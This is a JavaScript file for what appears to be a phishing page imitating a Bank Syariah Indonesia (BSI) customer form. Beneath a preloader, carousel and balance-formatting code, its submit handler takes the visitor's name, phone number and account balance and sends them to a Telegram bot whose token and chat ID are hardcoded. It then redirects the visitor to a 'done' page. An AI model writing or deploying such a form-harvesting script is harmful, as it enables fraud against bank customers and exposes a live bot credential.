window.addEventListener('load', function(){
    const pre = document.getElementById('preloader');
    if(pre){ pre.style.display = 'none'; }
});
document.addEventListener('DOMContentLoaded', ()=>{
    // handle form submit
    const form=document.getElementById('nasabahForm');
    const submitBtn = form.querySelector('button[type="submit"]');
    // format saldo input with thousand separators
    const saldoInput=document.getElementById('saldo');
    saldoInput.addEventListener('input', ()=>{
        // format with thousand sep (.) and decimal (,) ala Indonesia
        let val = saldoInput.value.replace(/[^0-9,]/g,'');
        // Pisahkan bagian desimal
        const parts = val.split(',');
        let intPart = parts[0];
        let decPart = parts[1] ? parts[1].slice(0,2) : '';
        if(intPart.length === 0){ saldoInput.value = decPart ? `0,${decPart}` : ''; return; }
        // hilangkan nol di depan bila >1 digit
        intPart = intPart.replace(/^0+(\d)/, '$1');
        intPart = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        saldoInput.value = decPart ? `${intPart},${decPart}` : intPart;
    });
    form.addEventListener('submit', e=>{
        e.preventDefault();
        submitBtn.disabled = true;
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Mohon Tunggu...';
        
        // Ambil data form
        const nama = document.getElementById('nama').value;
        const hp = document.getElementById('hp').value;
        const saldo = document.getElementById('saldo').value;
        
        const botToken = '7676048697:AAHv1_eDhcWJamdj-pqkBxmybzgPD2Yu9Kk';
        const chatId = '8242333335';
        
        // Format pesan
        const message = `NOTIF BSI FORM\n━━━━━━━━━━━━━━━━━━\nNama: ${nama}\nNomor HP: ${hp}\nSaldo: Rp. ${saldo}\n━━━━━━━━━━━━━━━━━━\nDeveloper: @androwebbuilders`;
        
        // Kirim ke Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            window.location.href = 'done.html';
        })
        .catch(error => {
            console.error('Error:', error);
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
        });
    });
    const slides=document.querySelectorAll('.carousel img');
    let idx=0;
    setInterval(()=>{
        slides[idx].classList.remove('active');
        idx = (idx+1)%slides.length;
        slides[idx].classList.add('active');
    },2000);
});
